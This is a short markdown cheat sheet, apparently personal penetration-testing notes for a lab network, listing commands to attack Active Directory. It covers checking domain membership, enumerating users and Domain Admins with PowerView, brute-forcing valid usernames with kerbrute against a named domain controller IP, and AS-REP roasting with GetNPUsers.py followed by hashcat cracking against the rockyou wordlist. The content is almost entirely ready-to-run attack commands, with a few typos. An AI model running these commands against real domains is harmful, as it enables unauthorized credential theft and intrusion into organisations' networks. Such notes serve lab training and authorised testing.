### Check if domain joined
```
systeminfo | findstr /B /C:"Domain"
# If it returns a domain name, the machine is domain-joined.
# If it returns WORKGROUP, it's not part of a domain.
```


### Powerview
```
# Users
Get-NetUser | select samaccountname
Get-NetUser | select samaccountname, memberof, serviceprincipalname
# DC IP
Get-NetDomainController -Domain domain.com

# Who is domain admin
Get-DomainGroupMember "Domain Admins" -Recurse

# You can use CME to get hostname <-> IP 
```

### Kerberos User enumeration
```
test if user names are validate:
kerbrute userenum -d relia.com --dc 172.16.143.6 users.txt 
```

###  LDAP Enumeration
```
ldapseasrch
```



### AS-REP Roasting (NO Pre-Auth)
> Crack with hashcat a.hash /usr/share/wordlists/rockyou.txt -m 18200
```
GetNPUsers.py relia.com/ -usersfile users.txt -no-pass -dc-ip 172.16.143.6
```
